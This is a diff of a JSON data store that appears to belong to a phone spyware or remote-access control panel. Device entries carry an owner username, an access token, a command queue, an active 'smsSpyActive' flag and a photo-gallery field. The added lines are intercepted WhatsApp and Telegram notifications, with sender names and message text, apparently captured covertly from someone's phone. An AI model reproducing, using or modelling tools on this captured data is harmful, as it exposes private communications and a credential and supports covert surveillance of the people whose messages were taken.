@@ -3072,7 +3072,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "3b9b91fe42c928810228c2889719201c",
-    "lastSeen": 1776747891644,
+    "lastSeen": 1776747897643,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T04:18:12.057Z",
@@ -3094,6 +3094,30 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 12:05",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776747900923
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16273 pesan baru dari 112 obrolan",
+        "time": "21/04 12:04",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776747900528
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Ara na Zakiii💕🫶💖💌💋",
+        "content": "iyaaa",
+        "time": "21/04 12:04",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776747894077
+      },
       {
         "appName": "WhatsApp",
         "sender": "Ara na Zakiii💕🫶💖💌💋",
@@ -7069,30 +7093,6 @@
         "time": "21/04 11:32",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776745954338
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:32",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745954259
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:32",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745954188
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 11:32",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776745954068
       }
     ],
     "galleryPhotos": [
